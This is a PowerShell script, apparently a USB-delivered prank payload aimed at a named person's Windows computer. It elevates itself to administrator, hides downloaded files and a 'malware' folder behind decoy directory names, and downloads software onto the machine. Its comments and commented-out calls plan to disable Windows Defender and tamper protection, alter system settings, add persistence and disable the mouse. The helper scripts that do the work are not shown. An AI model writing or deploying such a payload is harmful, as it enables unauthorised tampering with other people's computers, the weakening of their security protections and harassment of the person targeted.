# Allow script: Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine
# cd to USB : cd $((Get-WMIObject -Query "SELECT DeviceID FROM Win32_LogicalDisk WHERE VolumeName = 'RDUCKY'").DeviceID)
# Disable tamper: Configuration > Updates & security > Windows security > AV & threat configuration 
# Add permisons to folder $env:SYSTEMDRIVE\ProgramData\Microsoft\Windows\SystemData\
# TODO Add resources

# TODO use nircmd https://www.winhelponline.com/blog/refresh-icon-cache-windows-7-quickly/
# TODO add change folder ico prank

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-File $($MyInvocation.MyCommand.Path)"
    Exit
}

$usbName = 'RDUCKY' # CHANGE BY YOUR USB NAME
$usbData = Get-WMIObject -Query "SELECT DeviceID FROM Win32_LogicalDisk WHERE VolumeName = $usbName"
$usbDrive = $usbData.DeviceID

Write-Host $usbDrive
. $rootScriptDirectory"FuckHugo"\prepareProject.ps1
. $rootScriptDirectory"FuckHugo"\changeWallpapers.ps1
. $rootScriptDirectory"FuckHugo"\changeWindowsSettings.ps1
. $rootScriptDirectory"FuckHugo"\otherFunctionalities.ps1

function main {
    $usbData = Get-WmiObject -Query "SELECT DeviceID FROM Win32_LogicalDisk WHERE VolumeName='CCCOMA_X64FRE_ES-ES_DV9'"
    $usbDrive = $usbData.DeviceID

    Write-Output $usbData
    Write-Output $usbDrive
    $ProgressPreference = 'SilentlyContinue'

    $baseDir = "$env:WINDIR\Media\Garden"
    $tempDir = "$env:WINDIR\Temp"
    $decoyDirectory = "Wallpapers"

    $toolsDir = "$tempDir\Tools"
    $imagesDir = "$baseDir\$decoyDirectory\Images"
    $audiosDir = "$baseDir\$decoyDirectory\Audios"
    $videosDir = "$baseDir\$decoyDirectory\Videos"
    $dataDir = "$baseDir\$decoyDirectory\Data"
    $malwareDir = "$baseDir\$decoyDirectory\Software"

    createDirectories -baseDirectory $baseDir -temporalDirectory $tempDir -decoyName $decoyDirectory

    installYTDLP -toolsDirectory $toolsDir
    installPython -toolsDirectory $toolsDir
    downloadImages -imagesDirectory $imagesDir
    downloadAudios -audiosDirectory $audiosDir -toolsDirectory $toolsDir
    downloadSoftware -malwareDirectory $malwareDir

<#
    disableWindowsDefender
    deleteWallpaperEngine

    setWallpaper -code $using:wallpaperCode -directory $using:imagesDir
    setLockScreen -directory $using:imagesDir
    changeMouseScheme -imagesDirectory $using:imagesDir
    changeDefaultSound -audiosDirectory $using:audiosDir
    changeShortcuts -imagesDirectory $using:imagesDir

    #changeSettings -audiosDirectory $audiosDir -imagesDirectory $imagesDir # TODO think more jokes
    #changeShortcuts
    #persistanceChanges -malwareDirectory $malwareDir
    #disableMouse -seconds 10
    functionPresentation -text "Script Ended"
    #>


}

main